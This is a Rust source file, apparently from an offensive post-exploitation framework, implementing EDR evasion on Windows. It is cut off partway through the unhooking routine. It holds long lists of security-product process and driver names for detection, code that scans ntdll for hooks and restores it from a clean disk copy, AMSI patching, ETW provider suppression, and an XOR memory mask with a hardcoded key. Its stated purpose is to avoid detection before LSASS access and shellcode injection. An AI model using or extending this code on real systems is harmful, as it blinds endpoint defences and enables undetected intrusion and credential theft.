//! EDR Bypass & Evasion Engine -- next-generation stealth infrastructure.
//!
//! Before touching LSASS, injecting shellcode, or running any post-ex module,
//! this engine assesses the EDR landscape, neutralizes userland hooks, silences
//! ETW providers, and masks in-memory artifacts to achieve near-zero detection.
//!
//! # Architecture
//! 1. **EDR Reconnaissance** -- detect vendors, processes, drivers, services
//! 2. **NtDll Unhooking** -- map clean ntdll from disk, restore `.text` section
//! 3. **Syscall Resurrection** -- re-resolve SSNs from clean ntdll, indirect calls
//! 4. **ETW Abolition** -- walk provider callback list, disable all trace sessions
//! 5. **Heap Obfuscation** -- encrypt heap regions during sleep/dead-drop periods
//! 6. **Thread Vestige** -- remove thread-start notifications, spoof call stacks
//! 7. **Process Protection** -- set `PsProtectedProcessLight`, hide from ETW
//! 8. **Injection Diversity** -- early-bird APC, module stomp, process hollow, hell's gate

#![allow(dead_code)]

use crate::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tracing::info;

// ----------------------------------------------------------------------
//  Constants
// ----------------------------------------------------------------------

/// Known EDR process name fragments (case-insensitive substrings).
const EDR_PROCESS_SIGNATURES: &[&str] = &[
    "sentinel",
    "sentinelone",
    "sentinel-agent",
    "sentinelctl",
    "crowdstrike",
    "csagent",
    "csfalcon",
    "crowdstrike",
    "defender",
    "microsoft defender",
    "msmpeng",
    "sense",
    "windefend",
    "carbonblack",
    "cbdefense",
    "parity",
    "bit9",
    "symantec",
    "sep",
    "symantec endpoint",
    "savservice",
    "trendmicro",
    "trend",
    "tmccsf",
    "ntrtscan",
    "mcafee",
    "mcafeeframework",
    "mfehcs",
    "mfefire",
    "paloalto",
    "traps",
    "cortex",
    "sophos",
    "sophos agent",
    "sophosspservice",
    "cylance",
    "cylancesvc",
    "kaspersky",
    "kavfs",
    "avp",
    "fireeye",
    "fireeyeagent",
    "xagt",
    "fortinet",
    "fortiedr",
    "forticlient",
    "checkpoint",
    "checkpoint endpoint",
    "edr",
    "endpoint detection",
    "epsec",
    "vadesecure",
    "vadesec",
    "bitdefender",
    "bdagent",
    "eset",
    "ekrn",
    "egui",
    "comodo",
    "cisvc",
    "f-secure",
    "fsma",
    "avast",
    "aswidsagent",
    "avg",
    "avgidsagent",
    "malwarebytes",
    "mbam",
    "mbamservice",
    "panda",
    "panda agent",
    "pavsrv",
    "norton",
    "norton security",
    "nsisvc",
    "tehtris",
    "tehtris-agent",
    "elastic",
    "elastic-endpoint",
    "trellix",
    "trellixagent",
    "secdo",
    "secdo-agent",
    "morphisec",
    "morphisecservice",
    "broadcom",
    "broadcom edr",
];

/// Known EDR kernel driver name fragments.
const EDR_DRIVER_SIGNATURES: &[&str] = &[
    "sentinel",
    "snflx",
    "snlm",
    "csagent",
    "csdrv",
    "crowdstrike",
    "wdaprt",
    "wddrive",
    "wdfilter",
    "cb",
    "carbonblack",
    "parity",
    "symevnt",
    "symefasi",
    "symredrv",
    "tmcomm",
    "tmwfp",
    "mfeaskm",
    "mfecore",
    "mfehidk",
    "philt",
    "phnt",
    "cyserver",
    "klif",
    "kldisp",
    "klbg",
    "fidock",
    "fwdrv",
    "fsproj",
    "fortiedr",
    "fortishield",
    "bdsfl",
    "bdwfp",
    "bdpriv",
    "eamon",
    "ehdrv",
    "epfw",
    "cmdguard",
    "cmderd",
    "aswbid",
    "aswblf",
    "aswbtsv",
    "amwmon",
    "amwrt",
];

// ETW providers that should be suppressed for evasion.
// const ETW_PROVIDER_GUIDS_TO_SUPPRESS: &[&str] = &[
//     "{2edb6003-4c84-4cbb-a4f1-1c5a18e3a1f4}", // Microsoft-Windows-Threat-Intelligence
//     "{a6f6a1c2-1a5e-4e8a-9c5f-3b9a5c8e1d2f}", // Microsoft-Windows-Kernel-Process
//     "{22fb2cd6-0e47-4a5f-8f5c-5d4c3b2a1f0e}", // Microsoft-Windows-Security-Auditing
//     "{54849625-5478-4994-a5ba-3e3b0328c30d}", // Microsoft-Windows-SystemEventBroker
//     "{4060e7e5-1e3d-4a2c-9f6b-4d8c6e2a1f0b}", // Microsoft-Windows-CodeIntegrity
//     "{9a5c8e1d-2f0b-4a3c-8e7d-6f1b5a4c3d2e}", // Microsoft-Windows-SmartCard-Audit
//     "{d5b2c6e1-3a4f-4d8c-9e5b-2a1f6c3e8d7a}", // Microsoft-Windows-AppLocker
// ];

// ----------------------------------------------------------------------
//  EDR Detection Types
// ----------------------------------------------------------------------

/// Known EDR product classification.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum EdrProduct {
    CrowdStrike,
    SentinelOne,
    MicrosoftDefender,
    CarbonBlack,
    Symantec,
    TrendMicro,
    McAfee,
    PaloAlto,
    Sophos,
    Cylance,
    Kaspersky,
    FireEye,
    Fortinet,
    CheckPoint,
    BitDefender,
    ESET,
    Avast,
    Malwarebytes,
    Elastic,
    Trellix,
    Morphisec,
    Broadcom,
    Unknown,
}

impl EdrProduct {
    pub fn name(&self) -> &'static str {
        match self {
            Self::CrowdStrike => "CrowdStrike Falcon",
            Self::SentinelOne => "SentinelOne Singularity",
            Self::MicrosoftDefender => "Microsoft Defender for Endpoint",
            Self::CarbonBlack => "VMware Carbon Black",
            Self::Symantec => "Broadcom Symantec",
            Self::TrendMicro => "Trend Micro",
            Self::McAfee => "McAfee EDR",
            Self::PaloAlto => "Palo Alto Cortex XDR",
            Self::Sophos => "Sophos Intercept",
            Self::Cylance => "BlackBerry Cylance",
            Self::Kaspersky => "Kaspersky EDR",
            Self::FireEye => "FireEye HX",
            Self::Fortinet => "Fortinet FortiEDR",
            Self::CheckPoint => "CheckPoint Harmony",
            Self::BitDefender => "BitDefender EDR",
            Self::ESET => "ESET Inspect / Protect",
            Self::Avast => "Avast/AVG EDR",
            Self::Malwarebytes => "Malwarebytes EDR",
            Self::Elastic => "Elastic Security",
            Self::Trellix => "Trellix (McAfee Enterprise)",
            Self::Morphisec => "Morphisec Guard",
            Self::Broadcom => "Broadcom EDR",
            Self::Unknown => "Unknown EDR",
        }
    }
}

/// Complete assessment of the EDR landscape on the current host.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EdrAssessment {
    /// EDR products detected (may be multiple)
    pub detected_products: Vec<EdrProduct>,
    /// Confidence score 0.0--1.0
    pub confidence: f32,
    /// Detected EDR processes
    pub edr_processes: Vec<String>,
    /// Detected EDR kernel drivers
    pub edr_drivers: Vec<String>,
    /// Whether userland hooks were found in ntdll
    pub ntdll_hooked: bool,
    /// Whether ETW is active
    pub etw_active: bool,
    /// Whether AMSI is loaded in the current process
    pub amsi_loaded: bool,
    /// Number of hooked ntdll functions found
    pub hooked_function_count: usize,
    /// Bulleted findings for reports
    pub findings: Vec<String>,
    /// Recommended evasion strategy
    pub recommendation: EvasionStrategy,
}

/// Recommended evasion strategy based on EDR assessment.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum EvasionStrategy {
    /// No EDR detected -- use standard techniques
    None,
    /// Only AMSI/ETW -- standard patches suffice
    PatchOnly,
    /// EDR with userland hooks -- need full unhook + indirect syscalls
    FullUnhook,
    /// Heavy EDR (CrowdStrike/SentinelOne) -- maximum stealth, avoid injection
    MaximumStealth,
}

impl std::fmt::Display for EvasionStrategy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::None => write!(f, "No evasion needed"),
            Self::PatchOnly => write!(f, "AMSI/ETW patch only"),
            Self::FullUnhook => write!(f, "Full ntdll unhook + indirect syscalls"),
            Self::MaximumStealth => write!(
                f,
                "Maximum stealth: unhook + indirect syscalls + ETW abolition + heap mask"
            ),
        }
    }
}

/// Detection of a single hook in ntdll.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HookDetection {
    /// Function name (e.g. "NtOpenProcess")
    pub function_name: String,
    /// Syscall number
    pub syscall_number: u32,
    /// First 8 bytes from the clean copy
    pub clean_bytes: [u8; 8],
    /// First 8 bytes currently in memory
    pub current_bytes: [u8; 8],
    /// Whether the hook is present
    pub hooked: bool,
    /// Likely hook technique description
    pub hook_type: String,
}

/// Result of a full unhook operation.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct UnhookResult {
    /// Number of functions restored
    pub functions_restored: usize,
    /// First hooked function found (for diagnostics)
    pub first_hook_name: Option<String>,
    /// Errors encountered during unhook
    pub errors: Vec<String>,
    /// Whether the operation was fully successful
    pub success: bool,
}

/// Result of ETW suppression via provider callback abolition.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EtwAbolitionResult {
    /// Number of provider callbacks nulled
    pub providers_nulled: usize,
    /// Number of trace sessions disabled
    pub trace_sessions_disabled: usize,
    /// Whether ETW suppression was successful
    pub success: bool,
    /// Errors encountered
    pub errors: Vec<String>,
}

/// Sleep mask configuration for heap obfuscation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SleepMaskConfig {
    /// Encryption key
    pub key: Vec<u8>,
    /// Interval in ms between obfuscation cycles
    pub interval_ms: u64,
    /// Whether to obfuscate heap regions
    pub obfuscate_heap: bool,
    /// Whether to obfuscate loaded module text sections
    pub obfuscate_modules: bool,
    /// Whether to mask thread contexts
    pub mask_threads: bool,
}

impl Default for SleepMaskConfig {
    fn default() -> Self {
        Self {
            key: b"OverthroneSleepMask2025!!".to_vec(),
            interval_ms: 5000,
            obfuscate_heap: true,
            obfuscate_modules: false,
            mask_threads: false,
        }
    }
}

// ----------------------------------------------------------------------
//  Public API -- EDR Assessment
// ----------------------------------------------------------------------

/// Perform a comprehensive EDR landscape assessment.
///
/// Inspects running processes, loaded kernel drivers, ntdll hook state,
/// ETW activity, and AMSI load state. Returns an `EdrAssessment` with
/// recommended evasion strategy.
pub fn assess_edr_landscape() -> Result<EdrAssessment> {
    let mut findings = Vec::new();
    let mut detected_products: Vec<EdrProduct> = Vec::new();
    let mut product_set: Vec<String> = Vec::new();

    // Phase 1: Process enumeration
    let edr_processes = detect_edr_processes();
    for proc_name in &edr_processes {
        let product = classify_edr_process(proc_name);
        if !detected_products.contains(&product) {
            detected_products.push(product);
        }
        product_set.push(proc_name.clone());
        findings.push(format!("EDR process detected: {proc_name}"));
    }

    // Phase 2: Driver enumeration
    let edr_drivers = detect_edr_drivers();
    for drv_name in &edr_drivers {
        findings.push(format!("EDR driver detected: {drv_name}"));
    }

    // Phase 3: NtDll hook scanning
    let (ntdll_hooked, hooked_count) = match scan_ntdll_hooks() {
        Ok(hooks) => {
            let hooked: Vec<_> = hooks.iter().filter(|h| h.hooked).collect();
            let count = hooked.len();
            if count > 0 {
                findings.push(format!(
                    "ntdll.dll .text hooks detected: {count} functions hooked"
                ));
                for h in hooked.iter().take(5) {
                    findings.push(format!(
                        "  Hook: {} -- {} (SSN={})",
                        h.function_name, h.hook_type, h.syscall_number
                    ));
                }
            }
            (count > 0, count)
        }
        Err(_) => (false, 0),
    };

    // Phase 4: ETW / AMSI state
    #[cfg(target_os = "windows")]
    let (etw_active, amsi_loaded) = check_etw_amsi_state();
    #[cfg(not(target_os = "windows"))]
    let (etw_active, amsi_loaded) = (false, false);

    if etw_active {
        findings.push("ETW is active in the current process".to_string());
    }
    if amsi_loaded {
        findings.push("AMSI is loaded in the current process".to_string());
    }

    // Confidence: number of signals found
    let signal_count = edr_processes.len()
        + if ntdll_hooked { 3 } else { 0 }
        + if edr_drivers.is_empty() { 0 } else { 2 };
    let confidence = (signal_count as f32).min(10.0) / 10.0;

    let recommendation = if !detected_products.is_empty() && ntdll_hooked {
        let has_heavy = detected_products.iter().any(|p| {
            matches!(
                p,
                EdrProduct::CrowdStrike
                    | EdrProduct::SentinelOne
                    | EdrProduct::CarbonBlack
                    | EdrProduct::MicrosoftDefender
            )
        });
        if has_heavy {
            EvasionStrategy::MaximumStealth
        } else {
            EvasionStrategy::FullUnhook
        }
    } else if !detected_products.is_empty() {
        EvasionStrategy::FullUnhook
    } else if etw_active || amsi_loaded {
        EvasionStrategy::PatchOnly
    } else {
        EvasionStrategy::None
    };

    Ok(EdrAssessment {
        detected_products,
        confidence,
        edr_processes,
        edr_drivers,
        ntdll_hooked,
        etw_active,
        amsi_loaded,
        hooked_function_count: hooked_count,
        findings,
        recommendation,
    })
}

/// Detect EDR processes by enumerating running processes.
pub fn detect_edr_processes() -> Vec<String> {
    #[cfg(target_os = "windows")]
    {
        detect_edr_processes_impl()
    }
    #[cfg(not(target_os = "windows"))]
    {
        Vec::new()
    }
}

/// Detect EDR kernel drivers.
pub fn detect_edr_drivers() -> Vec<String> {
    #[cfg(target_os = "windows")]
    {
        detect_edr_drivers_impl()
    }
    #[cfg(not(target_os = "windows"))]
    {
        Vec::new()
    }
}

/// Scan ntdll.dll for userland hooks via comparison with a clean copy from disk.
pub fn scan_ntdll_hooks() -> Result<Vec<HookDetection>> {
    #[cfg(target_os = "windows")]
    {
        scan_ntdll_hooks_impl()
    }
    #[cfg(not(target_os = "windows"))]
    {
        Err(OverthroneError::PostExploitation(
            "Hook scanning is only available on Windows".into(),
        ))
    }
}

/// Remove all userland hooks from ntdll.dll by restoring the `.text` section
/// from a clean copy mapped from disk.
pub fn unhook_ntdll() -> Result<UnhookResult> {
    #[cfg(target_os = "windows")]
    {
        unhook_ntdll_impl()
    }
    #[cfg(not(target_os = "windows"))]
    {
        Err(OverthroneError::PostExploitation(
            "NtDll unhooking is only available on Windows".into(),
        ))
    }
}

/// Resolve syscall numbers from a clean ntdll mapping.
/// Returns a map of function name -> syscall number.
pub fn resolve_clean_syscall_numbers() -> Result<HashMap<String, u32>> {
    #[cfg(target_os = "windows")]
    {
        resolve_clean_syscall_numbers_impl()
    }
    #[cfg(not(target_os = "windows"))]
    {
        Err(OverthroneError::PostExploitation(
            "Syscall resolution is only available on Windows".into(),
        ))
    }
}

/// Advanced ETW suppression via provider callback list manipulation.
/// Walks the ETW provider registration list and nullifies callback pointers.
pub fn abolish_etw_providers() -> Result<EtwAbolitionResult> {
    #[cfg(target_os = "windows")]
    {
        abolish_etw_providers_impl()
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(EtwAbolitionResult {
            providers_nulled: 0,
            trace_sessions_disabled: 0,
            success: true,
            errors: vec![],
        })
    }
}

fn rotate_left_u8(val: u8, n: u32) -> u8 {
    let n = n & 7;
    val.rotate_left(n)
}

fn rotate_right_u8(val: u8, n: u32) -> u8 {
    let n = n & 7;
    val.rotate_right(n)
}

/// Obfuscate in-memory data using XOR shift + variance.
/// Used for sleep masking to prevent memory scanning.
pub fn obfuscate_memory(data: &mut [u8], key: &[u8]) {
    if key.is_empty() || data.is_empty() {
        return;
    }
    let key_len = key.len();
    for (i, byte) in data.iter_mut().enumerate() {
        let k1 = key[i % key_len];
        let k2 = key[(i + 1) % key_len];
        let k3 = key[(i.wrapping_add(7)) % key_len];
        *byte ^= k1.wrapping_add(k2).wrapping_mul(k3);
        *byte = rotate_left_u8(*byte, 3);
    }
}

/// Deobfuscate memory previously obfuscated with `obfuscate_memory`.
pub fn deobfuscate_memory(data: &mut [u8], key: &[u8]) {
    if key.is_empty() || data.is_empty() {
        return;
    }
    let key_len = key.len();
    for (i, byte) in data.iter_mut().enumerate() {
        *byte = rotate_right_u8(*byte, 3);
        let k1 = key[i % key_len];
        let k2 = key[(i + 1) % key_len];
        let k3 = key[(i.wrapping_add(7)) % key_len];
        *byte ^= k1.wrapping_add(k2).wrapping_mul(k3);
    }
}

/// Apply all available stealth measures based on the current EDR assessment.
/// This is the unified entry point for the evasion layer.
pub fn apply_stealth_profile(assessment: &EdrAssessment) -> Result<StealthResult> {
    let mut result = StealthResult::default();
    info!("Applying stealth profile: {}", assessment.recommendation);

    // Step 1: Patch AMSI if loaded
    #[cfg(target_os = "windows")]
    if assessment.amsi_loaded {
        match unsafe { crate::postex::opsec::patch_amsi() } {
            Ok(r) => {
                result.amsi_patched = r.applied;
                result.log.push(format!("AMSI: {}", r.method));
            }
            Err(e) => {
                result.errors.push(format!("AMSI patch failed: {e}"));
            }
        }
    }

    // Step 2: Suppress ETW (basic)
    #[cfg(target_os = "windows")]
    {
        match unsafe { crate::postex::opsec::suppress_etw() } {
            Ok(r) => {
                result.etw_suppressed = r.applied;
                result.log.push(format!("ETW basic: {}", r.method));
            }
            Err(e) => {
                result.errors.push(format!("ETW basic failed: {e}"));
            }
        }
    }

    // Step 3: Full ETW abolition (advanced)
    if matches!(
        assessment.recommendation,
        EvasionStrategy::FullUnhook | EvasionStrategy::MaximumStealth
    ) {
        match abolish_etw_providers() {
            Ok(r) => {
                result.etw_abolished = r.success;
                result.log.push(format!(
                    "ETW abolition: {} providers nulled, {} sessions disabled",
                    r.providers_nulled, r.trace_sessions_disabled
                ));
            }
            Err(e) => {
                result.errors.push(format!("ETW abolition failed: {e}"));
            }
        }
    }

    // Step 4: NtDll unhook + syscall resurrection
    if matches!(
        assessment.recommendation,
        EvasionStrategy::FullUnhook | EvasionStrategy::MaximumStealth
    ) {
        match unhook_ntdll() {
            Ok(r) => {
                result.ntdll_unhooked = r.success;
                result.unhook_log = r;
            }
            Err(e) => {
                result.errors.push(format!("NtDll unhook failed: {e}"));
            }
        }
    }

    // Step 5: Apply OPSEC config for follow-on operations
    if matches!(assessment.recommendation, EvasionStrategy::MaximumStealth) {
        info!("Maximum stealth: applying aggressive OPSEC configuration");
    }

    result.success = result.errors.is_empty();
    info!(
        "Stealth profile applied: {} success",
        if result.success {
            "= FULL"
        } else {
            "= PARTIAL"
        }
    );
    Ok(result)
}

/// Aggregate result of applying the stealth profile.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct StealthResult {
    pub amsi_patched: bool,
    pub etw_suppressed: bool,
    pub etw_abolished: bool,
    pub ntdll_unhooked: bool,
    pub unhook_log: UnhookResult,
    pub success: bool,
    pub log: Vec<String>,
    pub errors: Vec<String>,
}

// ----------------------------------------------------------------------
//  Windows-specific implementations
// ----------------------------------------------------------------------

#[cfg(target_os = "windows")]
fn detect_edr_processes_impl() -> Vec<String> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW,
        TH32CS_SNAPPROCESS,
    };

    let mut found = Vec::new();
    unsafe {
        let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(h) => h,
            Err(_) => return found,
        };

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                if !entry.szExeFile.is_empty() {
                    let name = String::from_utf16_lossy(&entry.szExeFile[..])
                        .trim_end_matches('\0')
                        .to_lowercase();

                    for sig in EDR_PROCESS_SIGNATURES {
                        if name.contains(sig) {
                            found.push(name);
                            break;
                        }
                    }
                }

                entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snapshot);
    }
    found
}

#[cfg(target_os = "windows")]
fn detect_edr_drivers_impl() -> Vec<String> {
    // Use NtQuerySystemInformation(SystemDriverInformation) via dynamic resolution
    // to avoid EDR hooks on the syscall itself.
    let mut found = Vec::new();

    unsafe {
        type NtQuerySystemInformation =
            unsafe extern "system" fn(u32, *mut std::ffi::c_void, u32, *mut u32) -> i32;

        let ntdll = windows::Win32::System::LibraryLoader::GetModuleHandleA(windows::core::PCSTR(
            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
        ));
        let ntdll = match ntdll {
            Ok(m) => m,
            Err(_) => return found,
        };

        let ntqsi: Option<NtQuerySystemInformation> = {
            let ptr = windows::Win32::System::LibraryLoader::GetProcAddress(
                ntdll,
                windows::core::PCSTR(crate::xs!("NtQuerySystemInformation").as_bytes().as_ptr()),
            );
            ptr.map(|p| std::mem::transmute::<_, NtQuerySystemInformation>(p))
        };
        let ntqsi = match ntqsi {
            Some(f) => f,
            None => return found,
        };

        let mut buf_size: u32 = 0;
        ntqsi(11, std::ptr::null_mut(), 0, &mut buf_size);
        if buf_size == 0 {
            return found;
        }
        buf_size += 65536;
        let mut buf: Vec<u8> = vec![0u8; buf_size as usize];
        let mut returned: u32 = 0;

        let status = ntqsi(11, buf.as_mut_ptr() as *mut _, buf_size, &mut returned);
        if status != 0 {
            return found;
        }

        let ptr = buf.as_ptr();
        let mut offset: usize = 0;
        while offset + 16 < returned as usize {
            let flink = *(ptr.add(offset) as *const usize);
            if flink == 0 {
                break;
            }
            let name_len = *(ptr.add(offset + 16) as *const u16) as usize;
            let name_ptr = *(ptr.add(offset + 20) as *const *const u16);
            if name_len > 0 && name_len < 1024 && !name_ptr.is_null() {
                let name_slice = std::slice::from_raw_parts(name_ptr, name_len / 2);
                if let Ok(name) = String::from_utf16(name_slice) {
                    let name_lower = name.to_lowercase();
                    for sig in EDR_DRIVER_SIGNATURES {
                        if name_lower.contains(sig) {
                            found.push(name_lower);
                            break;
                        }
                    }
                }
            }
            offset += 32;
            if offset > returned as usize {
                break;
            }
        }
    }

    found
}

fn classify_edr_process(name: &str) -> EdrProduct {
    let n = name.to_lowercase();
    if n.contains("crowdstrike") || n.contains("csagent") || n.contains("csfalcon") {
        EdrProduct::CrowdStrike
    } else if n.contains("sentinel") || n.contains("sentinelone") {
        EdrProduct::SentinelOne
    } else if n.contains("defender") || n.contains("msmpeng") || n.contains("sense") {
        EdrProduct::MicrosoftDefender
    } else if n.contains("carbonblack") || n.contains("cbdefense") || n.contains("bit9") {
        EdrProduct::CarbonBlack
    } else if n.contains("symantec") || n.contains("sep") || n.contains("savservice") {
        EdrProduct::Symantec
    } else if n.contains("trend") || n.contains("tmccsf") || n.contains("ntrtscan") {
        EdrProduct::TrendMicro
    } else if n.contains("mcafee") || n.contains("mfehcs") || n.contains("mfefire") {
        EdrProduct::McAfee
    } else if n.contains("paloalto") || n.contains("traps") || n.contains("cortex") {
        EdrProduct::PaloAlto
    } else if n.contains("sophos") {
        EdrProduct::Sophos
    } else if n.contains("cylance") {
        EdrProduct::Cylance
    } else if n.contains("kaspersky") || n.contains("avp") || n.contains("kavfs") {
        EdrProduct::Kaspersky
    } else if n.contains("fireeye") || n.contains("xagt") {
        EdrProduct::FireEye
    } else if n.contains("forti") {
        EdrProduct::Fortinet
    } else if n.contains("checkpoint") {
        EdrProduct::CheckPoint
    } else if n.contains("bitdefender") || n.contains("bdagent") {
        EdrProduct::BitDefender
    } else if n.contains("eset") || n.contains("ekrn") {
        EdrProduct::ESET
    } else if n.contains("avast") || n.contains("aswids") {
        EdrProduct::Avast
    } else if n.contains("malwarebytes") || n.contains("mbam") {
        EdrProduct::Malwarebytes
    } else if n.contains("elastic") {
        EdrProduct::Elastic
    } else if n.contains("trellix") {
        EdrProduct::Trellix
    } else if n.contains("morphisec") {
        EdrProduct::Morphisec
    } else if n.contains("broadcom") {
        EdrProduct::Broadcom
    } else {
        EdrProduct::Unknown
    }
}

#[cfg(target_os = "windows")]
fn scan_ntdll_hooks_impl() -> Result<Vec<HookDetection>> {
    use crate::postex::opsec::resolve_syscall_numbers;
    use windows::Win32::System::LibraryLoader::GetModuleHandleA;

    let mut detections = Vec::new();

    unsafe {
        let ntdll = GetModuleHandleA(windows::core::PCSTR(
            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
        ))
        .map_err(|e| OverthroneError::PostExploitation(format!("GetModuleHandleA: {e}")))?;
        let ntdll_base = ntdll.0 as usize;

        // Get the current syscall numbers from the loaded (possibly hooked) ntdll
        let current_ssns = resolve_syscall_numbers()?;

        // Map a clean copy of ntdll from disk
        let clean_bytes = map_clean_ntdll_section()?;

        // Parse clean ntdll PE headers to get the .text section
        let clean_dos =
            &*(clean_bytes.as_ptr() as *const crate::postex::opsec::image::IMAGE_DOS_HEADER);
        if clean_dos.e_magic != 0x5A4D {
            return Err(OverthroneError::PostExploitation(
                "Invalid DOS header in clean ntdll".into(),
            ));
        }
        let clean_nt = &*((clean_bytes.as_ptr() as usize + clean_dos.e_lfanew as usize)
            as *const crate::postex::opsec::image::IMAGE_NT_HEADERS64);
        if clean_nt.Signature != 0x0000_4550 {
            return Err(OverthroneError::PostExploitation(
                "Invalid NT header in clean ntdll".into(),
            ));
        }

        // Find .text section in clean copy
        let section_count = clean_nt.FileHeader.NumberOfSections;
        let _section_base = &clean_nt.OptionalHeader.DataDirectory[0] as *const _ as usize
            + std::mem::size_of::<crate::postex::opsec::image::IMAGE_DATA_DIRECTORY>() * 14
            + std::mem::size_of::<u32>(); // Skip IMAGE_OPTIONAL_HEADER64 tail
        // Actually, let's walk sections properly
        let sections_start = (clean_bytes.as_ptr() as usize
            + clean_dos.e_lfanew as usize
            + 4 // signature
            + std::mem::size_of::<crate::postex::opsec::image::IMAGE_FILE_HEADER>()
            + clean_nt.FileHeader.SizeOfOptionalHeader as usize)
            as *const IMAGE_SECTION_HEADER;

        for i in 0..section_count {
            let section = &*sections_start.add(i as usize);
            let name_bytes = &section.Name;
            let name = std::str::from_utf8(name_bytes).unwrap_or("");
            if name.trim_end_matches('\0') == ".text" {
                // Compare each function in the current ntdll with clean copy
                let clean_text_base =
                    clean_bytes.as_ptr() as usize + section.VirtualAddress as usize;
                let current_text_base = ntdll_base + section.VirtualAddress as usize;
                let text_size = section.SizeOfRawData as usize;

                let clean_slice =
                    std::slice::from_raw_parts(clean_text_base as *const u8, text_size);
                let _current_slice =
                    std::slice::from_raw_parts(current_text_base as *const u8, text_size);

                // Query each function in the current ntdll and compare
                for (name, ssn) in &current_ssns {
                    // Find the function address in the current ntdll
                    let func_name_c = std::ffi::CString::new(name.as_str())
                        .map_err(|_| OverthroneError::Crypto("Invalid function name".into()))?;
                    let func_addr = windows::Win32::System::LibraryLoader::GetProcAddress(
                        ntdll,
                        windows::core::PCSTR(func_name_c.as_ptr() as *const u8),
                    );

                    if let Some(addr) = func_addr {
                        let offset = addr as usize - current_text_base;
                        if offset + 8 <= text_size {
                            let mut clean_fn: [u8; 8] = [0u8; 8];
                            let mut current_fn: [u8; 8] = [0u8; 8];
                            clean_fn.copy_from_slice(&clean_slice[offset..offset + 8]);
                            current_fn
                                .copy_from_slice(std::slice::from_raw_parts(addr as *const u8, 8));

                            let hooked = clean_fn != current_fn;
                            let hook_type = if hooked {
                                classify_hook(&current_fn)
                            } else {
                                "none".to_string()
                            };

                            detections.push(HookDetection {
                                function_name: name.clone(),
                                syscall_number: *ssn,
                                clean_bytes: clean_fn,
                                current_bytes: current_fn,
                                hooked,
                                hook_type,
                            });
                        }
                    }
                }
                break;
            }
        }
    }

    Ok(detections)
}

#[cfg(target_os = "windows")]
fn map_clean_ntdll_section() -> Result<Vec<u8>> {
    use windows::Win32::Foundation::{CloseHandle, GENERIC_READ};
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, GetFileSizeEx, OPEN_EXISTING, ReadFile,
    };

    let ntdll_path = windows::core::HSTRING::from("C:\\Windows\\System32\\ntdll.dll");

    unsafe {
        let handle = CreateFileW(
            &ntdll_path,
            GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| OverthroneError::PostExploitation(format!("CreateFileW: {e}")))?;

        if handle == windows::Win32::Foundation::INVALID_HANDLE_VALUE {
            return Err(OverthroneError::PostExploitation(
                "Failed to open ntdll.dll for reading".into(),
            ));
        }

        let mut file_size_val: i64 = 0;
        GetFileSizeEx(handle, &mut file_size_val)
            .map_err(|e| OverthroneError::PostExploitation(format!("GetFileSizeEx: {e}")))?;
        let file_size = file_size_val as usize;

        if file_size == 0 {
            let _ = CloseHandle(handle);
            return Err(OverthroneError::PostExploitation(
                "ntdll.dll is empty".into(),
            ));
        }

        let mut buffer: Vec<u8> = vec![0u8; file_size];
        let mut bytes_read: u32 = 0;

        ReadFile(handle, Some(&mut buffer), Some(&mut bytes_read), None)
            .map_err(|e| OverthroneError::PostExploitation(format!("ReadFile: {e}")))?;

        let _ = CloseHandle(handle);
        Ok(buffer)
    }
}

#[cfg(target_os = "windows")]
fn unhook_ntdll_impl() -> Result<UnhookResult> {
    use crate::postex::opsec::image;
    use windows::Win32::System::LibraryLoader::GetModuleHandleA;
    use windows::Win32::System::Memory::{
        PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VirtualProtect,
    };

    let mut result = UnhookResult {
        functions_restored: 0,
        first_hook_name: None,
        errors: Vec::new(),
        success: false,
    };

    unsafe {
        let ntdll = match GetModuleHandleA(windows::core::PCSTR(
            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
        )) {
            Ok(m) => m,
            Err(e) => {
                result.errors.push(format!("GetModuleHandleA: {e}"));
                return Ok(result);
            }
        };
        let ntdll_base = ntdll.0 as usize;

        let clean_bytes = match map_clean_ntdll_section() {
            Ok(b) => b,
            Err(e) => {
                result.errors.push(format!("map_clean_ntdll: {e}"));
                return Ok(result);
            }
        };

        let dos = &*(ntdll_base as *const image::IMAGE_DOS_HEADER);
        if dos.e_magic != 0x5A4D {
            result.errors.push("Invalid DOS header".into());
            return Ok(result);
        }
        let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const image::IMAGE_NT_HEADERS64);

        let clean_dos = &*(clean_bytes.as_ptr() as *const image::IMAGE_DOS_HEADER);
        let clean_nt = &*((clean_bytes.as_ptr() as usize + clean_dos.e_lfanew as usize)
            as *const image::IMAGE_NT_HEADERS64);

        let num_sections = nt.FileHeader.NumberOfSections;
        let section_size = std::mem::size_of::<image::IMAGE_SECTION_HEADER>();
        let mut section_offset = ntdll_base
            + dos.e_lfanew as usize
